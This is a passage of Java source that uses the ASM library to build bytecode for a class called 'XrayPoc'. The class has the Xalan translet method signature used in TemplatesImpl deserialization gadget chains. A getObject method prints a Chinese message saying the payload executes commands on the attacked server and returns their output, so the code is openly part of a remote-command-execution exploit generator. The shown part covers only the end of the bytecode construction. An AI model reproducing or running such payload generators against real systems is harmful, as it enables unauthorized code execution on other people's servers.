            mv.visitLocalVariable("this", "LXrayPoc;", null, l0, l1, 0);
            mv.visitLocalVariable("document", "Lcom/sun/org/apache/xalan/internal/xsltc/DOM;", null, l0, l1, 1);
            mv.visitLocalVariable("iterator", "Lcom/sun/org/apache/xml/internal/dtm/DTMAxisIterator;", null, l0, l1, 2);
            mv.visitLocalVariable("handler", "Lcom/sun/org/apache/xml/internal/serializer/SerializationHandler;", null, l0, l1, 3);
            mv.visitMaxs(0, 4);
            mv.visitEnd();
        }
        cw.visitEnd();

        return cw.toByteArray();
    }


    public Object getObject() {
        System.out.println("该攻击类型用来在被攻击服务器上执行命令并输出");
        return dump();
    }
}
